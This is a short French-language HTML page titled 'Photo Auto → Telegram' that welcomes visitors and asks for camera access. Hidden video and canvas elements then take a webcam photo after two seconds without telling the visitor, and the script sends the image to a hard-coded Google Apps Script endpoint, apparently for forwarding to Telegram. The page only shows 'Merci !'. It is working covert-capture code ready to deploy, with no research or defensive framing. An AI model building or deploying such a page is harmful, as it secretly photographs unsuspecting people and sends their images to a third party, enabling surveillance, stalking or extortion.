<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>📸 Photo Auto → Telegram</title>
<style>
  body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; white-space: pre-wrap; }
</style>
</head>
<body>
<h1>Bienvenue !</h1>
<div id="status">Chargement...</div>

<!-- Éléments nécessaires à la capture, mais non affichés -->
<video id="video" autoplay playsinline muted style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');

navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
  .then(stream => { video.srcObject = stream; video.play(); })
  .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });

video.addEventListener('playing', () => {
  status.textContent = "Un instant...";
  setTimeout(prendrePhoto, 2000);
});

function prendrePhoto() {
  if (!video.videoWidth) { setTimeout(prendrePhoto, 300); return; }
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

  const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
  status.textContent = "Envoi...";
  envoyer(base64);
}

function envoyer(base64Image) {
  fetch(APPS_SCRIPT_URL, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({
      image: base64Image,
      nom: "photo_" + Date.now() + ".jpg",
      date: new Date().toLocaleString()
    })
  })
  .then(r => r.text())
  .then(txt => {
    console.log("Réponse Apps Script :", txt);
    status.textContent = txt.includes('"ok":true')
      ? "Merci ! ✅"
      : "Réponse du script :\n" + txt;
  })
  .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
}
</script>
</body>
</html>
